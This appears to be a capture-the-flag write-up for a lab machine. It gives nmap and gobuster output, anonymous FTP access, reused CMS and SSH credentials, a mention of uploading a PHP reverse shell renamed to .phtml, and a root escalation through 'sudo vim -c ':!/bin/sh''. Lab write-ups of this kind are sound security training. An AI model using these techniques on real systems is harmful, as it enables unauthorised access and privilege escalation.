# nmap

```shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 13:48 IST
Nmap scan report for 10.10.181.115
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.4.58
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

Looking in `ftp` found `/pub/ForMitch.txt` which was about bad credential 

Looking at port 80 and running gobuster and found `http://10.10.181.115/simple/` 

and running gobuster again on `/simple`

```
/index.php  (Status: 200) [Size: 19993]
/modules    (Status: 301) [Size: 323] [--> http://10.10.181.115/simple/modules/]
/uploads    (Status: 301) [Size: 323] [--> http://10.10.181.115/simple/uploads/]
/doc        (Status: 301) [Size: 319] [--> http://10.10.181.115/simple/doc/]    
/admin      (Status: 301) [Size: 321] [--> http://10.10.181.115/simple/admin/]  
/assets     (Status: 301) [Size: 322] [--> http://10.10.181.115/simple/assets/] 
/lib        (Status: 301) [Size: 319] [--> http://10.10.181.115/simple/lib/]    
/install.php (Status: 301) [Size: 0] [--> /simple/install.php/index.php]         
/config.php  (Status: 200) [Size: 0]                                             
/tmp         (Status: 301) [Size: 319] [--> http://10.10.181.115/simple/tmp/]  
```

found login page and 

![image-20220517153154516](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220517153154516.png)

**cms Credential** `mitch:secret` and the same Credential were also used for `ssh` on port `2222`

we can also upload `php reverse shell` by changing its extension to `.phtml`  

login into the ssh and run `sudo -l` found vim 

![image-20220517155957792](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220517155957792.png)

used `sudo vim -c ':!/bin/sh'` command to escalate privilage.